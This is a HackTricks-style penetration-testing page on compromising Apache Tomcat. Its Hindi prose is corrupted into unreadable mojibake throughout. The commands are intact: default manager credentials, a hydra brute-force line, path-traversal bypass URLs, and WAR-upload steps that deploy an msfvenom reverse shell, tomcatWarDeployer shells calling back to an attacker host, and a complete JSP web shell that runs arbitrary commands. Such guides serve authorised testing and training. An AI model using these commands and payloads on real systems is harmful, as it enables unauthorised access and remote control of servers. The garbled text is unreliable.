# Tomcat

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Discovery

* ‡§Ø‡§π ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ **‡§™‡•ã‡§∞‡•ç‡§ü 8080** ‡§™‡§∞ ‡§ö‡§≤‡§§‡§æ ‡§π‡•à
* **‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø Tomcat ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø:**

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

## Enumeration

### **‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§™‡§π‡§ö‡§æ‡§®**

Apache Tomcat ‡§ï‡•á ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§ï‡•ã ‡§ñ‡•ã‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§è‡§ï ‡§∏‡§æ‡§ß‡§æ‡§∞‡§£ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
‡§Ø‡§π ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º ‡§Ö‡§®‡•Å‡§ï‡•ç‡§∞‡§Æ‡§£‡§ø‡§ï‡§æ ‡§™‡•É‡§∑‡•ç‡§† ‡§Æ‡•á‡§Ç "Tomcat" ‡§∂‡§¨‡•ç‡§¶ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§ó‡§æ, ‡§ú‡•ã HTML ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•á ‡§∂‡•Ä‡§∞‡•ç‡§∑‡§ï ‡§ü‡•à‡§ó ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§ï‡•ã ‡§™‡•ç‡§∞‡§ï‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ‡•§

### **‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ï ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡§æ ‡§∏‡•ç‡§•‡§æ‡§®**

**`/manager`** ‡§î‡§∞ **`/host-manager`** ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§∏‡§ü‡•Ä‡§ï ‡§∏‡•ç‡§•‡§æ‡§®‡•ã‡§Ç ‡§ï‡•Ä ‡§™‡§π‡§ö‡§æ‡§® ‡§ï‡§∞‡§®‡§æ ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§â‡§®‡§ï‡•á ‡§®‡§æ‡§Æ ‡§¨‡§¶‡§≤‡•á ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§® ‡§™‡•É‡§∑‡•ç‡§†‡•ã‡§Ç ‡§ï‡•ã ‡§ñ‡•ã‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¨‡•ç‡§∞‡•Ç‡§ü-‡§´‡•ã‡§∞‡•ç‡§∏ ‡§ñ‡•ã‡§ú ‡§ï‡•Ä ‡§∏‡§ø‡§´‡§æ‡§∞‡§ø‡§∂ ‡§ï‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à‡•§

### **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§æ‡§Æ ‡§ó‡§£‡§®‡§æ**

Tomcat ‡§ï‡•á 6 ‡§∏‡•á ‡§™‡•Å‡§∞‡§æ‡§®‡•á ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§æ‡§Æ‡•ã‡§Ç ‡§ï‡•Ä ‡§ó‡§£‡§®‡§æ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏**

**`/manager/html`** ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π WAR ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡•á ‡§Ö‡§™‡§≤‡•ã‡§° ‡§î‡§∞ ‡§§‡•à‡§®‡§æ‡§§‡•Ä ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à, ‡§ú‡•ã ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•Ä ‡§ì‡§∞ ‡§≤‡•á ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§¨‡•Å‡§®‡§ø‡§Ø‡§æ‡§¶‡•Ä HTTP ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡•Ä‡§ï‡§∞‡§£ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§π‡•à, ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§π‡•à‡§Ç:

* admin:admin
* tomcat:tomcat
* admin:
* admin:s3cr3t
* tomcat:s3cr3t
* admin:tomcat

‡§á‡§® ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡§æ ‡§™‡§∞‡•Ä‡§ï‡•ç‡§∑‡§£ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
‡§è‡§ï ‡§î‡§∞ ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ **`/manager/status`** ‡§π‡•à, ‡§ú‡•ã Tomcat ‡§î‡§∞ OS ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡§∞‡•ç‡§∂‡§ø‡§§ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§ï‡§Æ‡§ú‡•ã‡§∞‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•Ä ‡§™‡§π‡§ö‡§æ‡§® ‡§Æ‡•á‡§Ç ‡§Æ‡§¶‡§¶ ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à‡•§

### **Brute Force Attack**

‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ï ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ ‡§™‡§∞ ‡§¨‡•ç‡§∞‡•Ç‡§ü ‡§´‡•ã‡§∞‡•ç‡§∏ ‡§π‡§Æ‡§≤‡•á ‡§ï‡§æ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§ï‡•ã‡§à ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
Along with setting various parameters in Metasploit to target a specific host.

## ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§ï‡§Æ‡§ú‡•ã‡§∞‡§ø‡§Ø‡§æ‡§Å

### **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§¨‡•à‡§ï‡§ü‡•ç‡§∞‡•á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§ü‡•Ä‡§ï‡§∞‡§£**

`/auth.jsp` ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§®‡•á ‡§∏‡•á ‡§≠‡§æ‡§ó‡•ç‡§Ø‡§∂‡§æ‡§≤‡•Ä ‡§™‡§∞‡§ø‡§∏‡•ç‡§•‡§ø‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§¨‡•à‡§ï‡§ü‡•ç‡§∞‡•á‡§∏ ‡§ï‡•á ‡§§‡§π‡§§ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§™‡•ç‡§∞‡§ï‡§ü ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

### **‡§°‡§¨‡§≤ URL ‡§è‡§®‡•ç‡§ï‡•ã‡§°‡§ø‡§Ç‡§ó**

`mod_jk` ‡§Æ‡•á‡§Ç CVE-2007-1860 ‡§ï‡§Æ‡§ú‡•ã‡§∞‡§ø‡§Ø‡§æ‡§Å ‡§°‡§¨‡§≤ URL ‡§è‡§®‡•ç‡§ï‡•ã‡§°‡§ø‡§Ç‡§ó ‡§™‡§• ‡§Ø‡§æ‡§§‡•ç‡§∞‡§æ ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à‡§Ç, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§§‡•à‡§Ø‡§æ‡§∞ ‡§ï‡§ø‡§è ‡§ó‡§è URL ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§® ‡§á‡§Ç‡§ü‡§∞‡§´‡§º‡•á‡§∏ ‡§§‡§ï ‡§Ö‡§®‡§ß‡§ø‡§ï‡•É‡§§ ‡§™‡§π‡•Å‡§Å‡§ö ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§

‡§ü‡•â‡§Æ‡§ï‡•à‡§ü ‡§ï‡•á ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§® ‡§µ‡•á‡§¨ ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡§æ‡§è‡§Å: `pathTomcat/%252E%252E/manager/html`

### /examples

Apache Tomcat ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ 4.x ‡§∏‡•á 7.x ‡§Æ‡•á‡§Ç ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§™‡•ç‡§∞‡§ï‡§ü‡•Ä‡§ï‡§∞‡§£ ‡§î‡§∞ ‡§ï‡•ç‡§∞‡•â‡§∏-‡§∏‡§æ‡§á‡§ü ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡§ø‡§Ç‡§ó (XSS) ‡§π‡§Æ‡§≤‡•ã‡§Ç ‡§ï‡•á ‡§™‡•ç‡§∞‡§§‡§ø ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§π‡•à‡§Ç‡•§ ‡§á‡§® ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•ã‡§Ç ‡§ï‡•Ä ‡§™‡•Ç‡§∞‡•Ä ‡§∏‡•Ç‡§ö‡•Ä ‡§ï‡•ã ‡§Ö‡§®‡§ß‡§ø‡§ï‡•É‡§§ ‡§™‡§π‡•Å‡§Å‡§ö ‡§î‡§∞ ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∂‡•ã‡§∑‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡§æ‡§Ç‡§ö‡§æ ‡§ú‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ [‡§Ø‡§π‡§æ‡§Å ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **‡§™‡§• ‡§Ø‡§æ‡§§‡•ç‡§∞‡§æ ‡§∂‡•ã‡§∑‡§£**

‡§ï‡•Å‡§õ [**‡§ü‡•â‡§Æ‡§ï‡•à‡§ü ‡§ï‡•á ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§®**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) ‡§Æ‡•á‡§Ç ‡§Ü‡§™ ‡§™‡§• ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ü‡•â‡§Æ‡§ï‡•à‡§ü ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ‡§ì‡§Ç ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç: `/..;/`

‡§§‡•ã, ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™ **‡§ü‡•â‡§Æ‡§ï‡•à‡§ü ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ï** ‡§™‡•É‡§∑‡•ç‡§† ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç: `www.vulnerable.com/lalala/..;/manager/html`

**‡§è‡§ï ‡§î‡§∞ ‡§§‡§∞‡•Ä‡§ï‡§æ** ‡§á‡§∏ ‡§ö‡§æ‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§∏‡§Ç‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§™‡§•‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§π‡•à: `http://www.vulnerable.com/;param=value/manager/html`

## RCE

‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç, ‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ ‡§ü‡•â‡§Æ‡§ï‡•à‡§ü ‡§µ‡•á‡§¨ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ï ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ **‡§è‡§ï .war ‡§´‡§º‡§æ‡§á‡§≤ ‡§Ö‡§™‡§≤‡•ã‡§° ‡§î‡§∞ ‡§§‡•à‡§®‡§æ‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç (‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç)**‡•§

### ‡§∏‡•Ä‡§Æ‡§æ‡§è‡§Å

‡§Ü‡§™ ‡§ï‡•á‡§µ‡§≤ ‡§§‡§≠‡•Ä WAR ‡§§‡•à‡§®‡§æ‡§§ ‡§ï‡§∞ ‡§™‡§æ‡§è‡§Ç‡§ó‡•á ‡§ú‡§¨ ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ **‡§™‡§∞‡•ç‡§Ø‡§æ‡§™‡•ç‡§§ ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞** (‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ‡§è‡§Å: **admin**, **manager** ‡§î‡§∞ **manager-script**) ‡§π‡•ã‡§Ç‡•§ ‡§Ø‡•á ‡§µ‡§ø‡§µ‡§∞‡§£ ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ _tomcat-users.xml_ ‡§ï‡•á ‡§§‡§π‡§§ ‡§™‡§æ‡§è ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã `/usr/share/tomcat9/etc/tomcat-users.xml` ‡§Æ‡•á‡§Ç ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§ø‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à (‡§Ø‡§π ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£‡•ã‡§Ç ‡§ï‡•á ‡§¨‡•Ä‡§ö ‡§≠‡§ø‡§®‡•ç‡§® ‡§π‡•ã‡§§‡§æ ‡§π‡•à) (‡§¶‡•á‡§ñ‡•á‡§Ç [POST ](./#post)section)‡•§
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### ‡§Æ‡•á‡§ü‡§æ‡§∏‡•ç‡§™‡•ç‡§≤‡•â‡§á‡§ü
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom Reverse Shell

1. ‡§§‡•à‡§®‡§æ‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§µ‡§æ‡§∞ ‡§¨‡§®‡§æ‡§è‡§Å:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LPORT> -f war -o revshell.war
```
2. `revshell.war` ‡§´‡§º‡§æ‡§á‡§≤ ‡§Ö‡§™‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§á‡§∏‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ï‡§∞‡•á‡§Ç (`/revshell/`):

### [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer) ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§æ‡§á‡§Ç‡§° ‡§î‡§∞ ‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•á‡§≤

‡§ï‡•Å‡§õ ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§Ø‡§π ‡§ï‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ (‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•Å‡§∞‡§æ‡§®‡•á ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£‡•ã‡§Ç ‡§Æ‡•á‡§Ç) 

#### ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§°
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### ‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•á‡§≤
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### ‡§¨‡§æ‡§á‡§Ç‡§° ‡§∂‡•á‡§≤
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### Using [Culsterd](https://github.com/hatRiot/clusterd)
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### Manual method - Web shell

**index.jsp** ‡§ï‡•ã ‡§á‡§∏ [‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡§®‡§æ‡§è‡§Ç:
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
‡§Ü‡§™ ‡§á‡§∏‡•á ‡§≠‡•Ä ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç (‡§Ö‡§™‡§≤‡•ã‡§°, ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§î‡§∞ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### ‡§Æ‡•à‡§®‡•Å‡§Ö‡§≤ ‡§µ‡§ø‡§ß‡§ø 2

‡§è‡§ï JSP ‡§µ‡•á‡§¨ ‡§∂‡•á‡§≤ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç ‡§ú‡•à‡§∏‡•á [‡§Ø‡§π](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) ‡§î‡§∞ ‡§è‡§ï WAR ‡§´‡§º‡§æ‡§á‡§≤ ‡§¨‡§®‡§æ‡§è‡§Ç:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Tomcat ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡§æ ‡§®‡§æ‡§Æ `tomcat-users.xml` ‡§π‡•à ‡§î‡§∞ ‡§Ø‡§π ‡§´‡§º‡§æ‡§á‡§≤ ‡§ü‡•â‡§Æ‡§ï‡•à‡§ü ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•Ä ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•ã ‡§¶‡§∞‡•ç‡§∂‡§æ‡§§‡•Ä ‡§π‡•à‡•§
```bash
find / -name tomcat-users.xml 2>/dev/null
```
‡§â‡§¶‡§æ‡§π‡§∞‡§£:
```xml
[...]
<!--
By default, no user is included in the "manager-gui" role required
to operate the "/manager/html" web application.  If you wish to use this app,
you must define such a user - the username and password are arbitrary.

Built-in Tomcat manager roles:
- manager-gui    - allows access to the HTML GUI and the status pages
- manager-script - allows access to the HTTP API and the status pages
- manager-jmx    - allows access to the JMX proxy and the status pages
- manager-status - allows access to the status pages only
-->
[...]
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```
## ‡§Ö‡§®‡•ç‡§Ø ‡§ü‡•â‡§Æ‡§ï‡•à‡§ü ‡§∏‡•ç‡§ï‡•à‡§®‡§ø‡§Ç‡§ó ‡§ü‡•Ç‡§≤

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
